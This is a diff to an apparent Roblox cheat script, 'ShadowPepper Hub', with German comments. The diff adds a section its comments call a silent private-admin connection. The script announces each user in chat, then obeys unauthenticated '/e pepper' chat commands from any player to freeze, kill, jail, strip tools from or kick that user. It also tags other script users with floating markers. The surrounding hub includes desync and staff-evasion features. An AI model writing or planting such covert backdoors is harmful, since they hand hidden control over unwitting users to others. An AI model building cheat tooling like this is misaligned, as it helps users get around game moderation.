@@ -12,13 +12,16 @@ local HttpService = game:GetService("HttpService")
 
 local lp = Players.LocalPlayer
 
+-- Setze das Erkennungs-Attribut für dieses Script
+lp:SetAttribute("ShadowPepperUser", true)
+
 local BlacklistedUsers = {
     [10641067963] = true,
     [1] = true,
 }
 
 if BlacklistedUsers[lp.UserId] then
-    lp:Kick("🛡️ ShadowPepper Hub:\nYou are permanently blacklisted from using this script.")
+    lp:Kick("[ShadowPepper Hub]\nYou are permanently blacklisted from using this script.")
     return
 end
 
@@ -284,6 +287,210 @@ getgenv().SMKT_DISABLE = function()
     ClearRender()
     if CoreGui:FindFirstChild("SchmecktHubPro") then CoreGui.SchmecktHubPro:Destroy() end
 end
+
+----------------------------------------------------
+-- LAUTLOSE PRIVATE-ADMIN VERBINDUNG & EXECUTION
+----------------------------------------------------
+local function sendChat(msg)
+    pcall(function()
+        local TextChatService = game:GetService("TextChatService")
+        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+            local channel = TextChatService.TextChannels.RBXGeneral
+            if channel then channel:SendAsync(msg) end
+        else
+            local sayMsgReq = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
+                and game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents:FindFirstChild("SayMessageRequest")
+            if sayMsgReq then
+                sayMsgReq:FireServer(msg, "All")
+            else
+                Players:Chat(msg)
+            end
+        end
+    end)
+end
+
+-- Remote Action State-Variablen
+local isFrozen = false
+local isJailed = false
+local jailLoopConnection = nil
+local jailPosition = Vector3.new(0, -500, 0) -- Sicherer Underground-Ort
+
+local function handleRemoteCommand(cmd, targetId)
+    if tostring(targetId) ~= tostring(lp.UserId) then return end
+
+    if cmd == "freeze" then
+        isFrozen = true
+        local char = lp.Character
+        local hrp = char and char:FindFirstChild("HumanoidRootPart")
+        if hrp then hrp.Anchored = true end
+        
+    elseif cmd == "unfreeze" then
+        isFrozen = false
+        local char = lp.Character
+        local hrp = char and char:FindFirstChild("HumanoidRootPart")
+        if hrp then hrp.Anchored = false end
+        
+    elseif cmd == "kill" then
+        local char = lp.Character
+        local hrp = char and char:FindFirstChild("HumanoidRootPart")
+        local hum = char and char:FindFirstChildOfClass("Humanoid")
+        if hrp and hum then
+            -- Fall in den Void simulieren, um sicher zu sterben (Server Replicated)
+            hrp.CFrame = CFrame.new(0, -9999, 0)
+            hrp.AssemblyLinearVelocity = Vector3.new(0, -5000, 0)
+            task.wait(0.1)
+            hum.Health = 0
+        end
+        
+    elseif cmd == "jail" then
+        isJailed = true
+        if jailLoopConnection then jailLoopConnection:Disconnect() end
+        
+        -- Lokale Jail-Zelle unter der Map bauen, damit wir nicht endlos fallen
+        local cage = Workspace:FindFirstChild("LocalJailCage")
+        if not cage then
+            cage = Instance.new("Part")
+            cage.Name = "LocalJailCage"
+            cage.Size = Vector3.new(15, 1, 15)
+            cage.Position = jailPosition - Vector3.new(0, 2, 0)
+            cage.Anchored = true
+            cage.Parent = Workspace
+        end
+
+        jailLoopConnection = RunService.Heartbeat:Connect(function()
+            local char = lp.Character
+            local hrp = char and char:FindFirstChild("HumanoidRootPart")
+            if hrp and isJailed then
+                hrp.CFrame = CFrame.new(jailPosition)
+                hrp.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+            end
+        end)
+        
+    elseif cmd == "unjail" then
+        isJailed = false
+        if jailLoopConnection then jailLoopConnection:Disconnect() end
+        local cage = Workspace:FindFirstChild("LocalJailCage")
+        if cage then cage:Destroy() end
+        
+        -- Zurückteleportieren an die Oberfläche
+        local char = lp.Character
+        local hrp = char and char:FindFirstChild("HumanoidRootPart")
+        if hrp then
+            hrp.CFrame = CFrame.new(0, 50, 0) -- Teleport zu Safe-Spawn CFrame
+        end
+        
+    elseif cmd == "deletetools" then
+        for _, tool in ipairs(lp.Backpack:GetChildren()) do
+            if tool:IsA("Tool") then tool:Destroy() end
+        end
+        local char = lp.Character
+        if char then
+            for _, tool in ipairs(char:GetChildren()) do
+                if tool:IsA("Tool") then tool:Destroy() end
+            end
+        end
+        
+    elseif cmd == "kick" then
+        lp:Kick("[ShadowPepper Hub Private Terminated]\nAn administrator has terminated your session.")
+    end
+end
+
+-- Chat Event Listener
+local function hookPlayerChat(plr)
+    plr.Chatted:Connect(function(msg)
+        local args = string.split(msg, " ")
+        if args[1] == "/e" and args[2] == "pepper" then
+            local cmd = args[3]
+            
+            -- Query (Admin scannt den Server nach Usern ab)
+            if cmd == "query" then
+                task.wait(math.random(0.1, 0.6))
+                sendChat("/e pepper ping")
+                
+            -- Ping (Registriert den User lokal für andere)
+            elseif cmd == "ping" then
+                plr:SetAttribute("ShadowPepperUser", true)
+                
+            -- Admin Command Ausführung
+            elseif args[4] then
+                handleRemoteCommand(cmd, args[4])
+            end
+        end
+    end)
+end
+
+-- Hook für alle Spieler im Server laden
+for _, plr in ipairs(Players:GetPlayers()) do hookPlayerChat(plr) end
+Players.PlayerAdded:Connect(hookPlayerChat)
+
+-- Automatische Erkennung ankündigen (Sorgt dafür, dass du im Admin-Panel auftauchst)
+task.spawn(function()
+    task.wait(2)
+    sendChat("/e pepper ping")
+end)
+
+-- 3D Marker-System (Schwebendes ShadowPepper Logo über Script Usern)
+local activeMarkers = {}
+local function updateShadowPepperMarkers()
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player ~= lp and player:GetAttribute("ShadowPepperUser") == true then
+            local char = player.Character
+            if char then
+                local head = char:FindFirstChild("Head")
+                if head then
+                    local marker = activeMarkers[player]
+                    if not marker or marker.Parent ~= char then
+                        if marker then pcall(function() marker:Destroy() end) end
+                        
+                        local bb = Instance.new("BillboardGui")
+                        bb.Name = "ShadowPepperUserMarker"
+                        bb.Adornee = head
+                        bb.Size = UDim2.new(0, 35, 0, 35)
+                        bb.StudsOffset = Vector3.new(0, 2.5, 0)
+                        bb.AlwaysOnTop = true
+                        bb.Parent = char
+                        
+                        local imgFrame = Instance.new("Frame", bb)
+                        imgFrame.Size = UDim2.new(1, 0, 1, 0)
+                        imgFrame.BackgroundColor3 = Color3.fromRGB(14, 10, 10)
+                        imgFrame.BorderSizePixel = 0
+                        Instance.new("UICorner", imgFrame).CornerRadius = UDim.new(1, 0)
+                        local stroke = Instance.new("UIStroke", imgFrame)
+                        stroke.Color = Color3.fromRGB(255, 40, 40)
+                        stroke.Thickness = 1.5
+
+                        local img = Instance.new("ImageLabel", imgFrame)
+                        img.Size = UDim2.new(1, -4, 1, -4)
+                        img.Position = UDim2.new(0, 2, 0, 2)
+                        img.BackgroundTransparency = 1
+                        img.Image = LOGO_ASSET
+                        Instance.new("UICorner", img).CornerRadius = UDim.new(1, 0)
+                        
+                        activeMarkers[player] = bb
+                    end
+                    -- Schwebende Animation
+                    local bb = activeMarkers[player]
+                    if bb then
+                        local bobOffset = math.sin(tick() * 3) * 0.2
+                        bb.StudsOffset = Vector3.new(0, 2.5 + bobOffset, 0)
+                    end
+                end
+            else
+                activeMarkers[player] = nil
+            end
+        else
+            if activeMarkers[player] then
+                pcall(function() activeMarkers[player]:Destroy() end)
+                activeMarkers[player] = nil
+            end
+        end
+    end
+end
+table.insert(RenderConnections, RunService.RenderStepped:Connect(updateShadowPepperMarkers))
+
+----------------------------------------------------
+-- ENDE KOMMUNIKATIONS-PROTOKOLLE
+----------------------------------------------------
 
 local function BuildUI()
     local IS_MOBILE = Shared.Platform == "Mobile" or UserInputService.TouchEnabled
@@ -694,7 +901,7 @@ local function BuildUI()
     CreateSection("Misc")
     CreateToggle("Player Panel", "PlayerPanel", function(st) if st then Load_PlayerPanel() else Stop_Generic("SchmecktPlayerPanel") end end)
     CreateToggle("Purchase Panel", "PurchasePanel", function(st) if st then Load_PurchasePanel() else Stop_Generic("SchmecktPurchasePanel") end end)
-    CreateToggle("Staff Notifier", "StaffNotifier", function(st) if st then Load_StaffNotifier() else Stop_Generic("StaffNotifierGui") Stop_Generic("StaffListGui") end end)
+    CreateToggle("Staff Notifier (not working rn)", "StaffNotifier", function(st) if st then Load_StaffNotifier() else Stop_Generic("StaffNotifierGui") Stop_Generic("StaffListGui") end end)
     CreateToggle("Desync Panel", "DesyncPanel", function(st)
         if st then
             Load_DesyncPanel()
